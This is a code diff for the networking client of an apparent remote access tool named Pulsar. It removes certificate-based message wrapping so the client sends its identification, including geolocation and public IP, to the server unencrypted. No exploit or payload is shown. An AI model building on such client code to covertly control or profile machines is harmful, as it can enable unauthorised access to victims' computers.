@@ -21,21 +21,10 @@ namespace Pulsar.Client.Networking
 {
     public class PulsarClient : Client, IDisposable
     {
-    /// <summary>
-    /// Used to keep track if the client has been identified by the server.
-    /// </summary>
-    private bool _identified;
-
-    /// <summary>
-    /// Cached server certificate for secure envelope derivation.
-    /// </summary>
-    private readonly X509Certificate2 _serverCertificate;
-
-#if DEBUG
-    private bool ShouldUseSecureEnvelope => false;
-#else
-    private bool ShouldUseSecureEnvelope => SecureMessageEnvelopeHelper.CanUse(_serverCertificate);
-#endif
+        /// <summary>
+        /// Used to keep track if the client has been identified by the server.
+        /// </summary>
+        private bool _identified;
 
         /// <summary>
         /// The hosts manager which contains the available hosts to connect to.
@@ -72,7 +61,6 @@ namespace Pulsar.Client.Networking
             base.ClientFail += OnClientFail;
             _tokenSource = new CancellationTokenSource();
             _token = _tokenSource.Token;
-            _serverCertificate = serverCertificate;
         }
 
         /// <summary>
@@ -150,20 +138,6 @@ namespace Pulsar.Client.Networking
 
         private void OnClientRead(Client client, IMessage message, int messageLength)
         {
-            if (ShouldUseSecureEnvelope && message is SecureMessageEnvelope secureEnvelope)
-            {
-                try
-                {
-                    message = SecureMessageEnvelopeHelper.Unwrap(secureEnvelope, _serverCertificate);
-                }
-                catch (Exception ex)
-                {
-                    Debug.WriteLine($"Failed to unwrap secure envelope: {ex.Message}");
-                    client.Disconnect();
-                    return;
-                }
-            }
-
             if (!_identified)
             {
                 if (message is ClientIdentificationResult reply)
@@ -213,23 +187,7 @@ namespace Pulsar.Client.Networking
                     PublicIP = geoInfo.IpAddress ?? "Unknown"
                 };
 
-                if (ShouldUseSecureEnvelope)
-                {
-                    try
-                    {
-                        var envelope = SecureMessageEnvelopeHelper.Wrap(identification, _serverCertificate);
-                        client.Send(envelope);
-                    }
-                    catch (Exception ex)
-                    {
-                        Debug.WriteLine($"Failed to send secure identification: {ex.Message}");
-                        client.Send(identification);
-                    }
-                }
-                else
-                {
-                    client.Send(identification);
-                }
+                client.Send(identification);
             }
         }
 
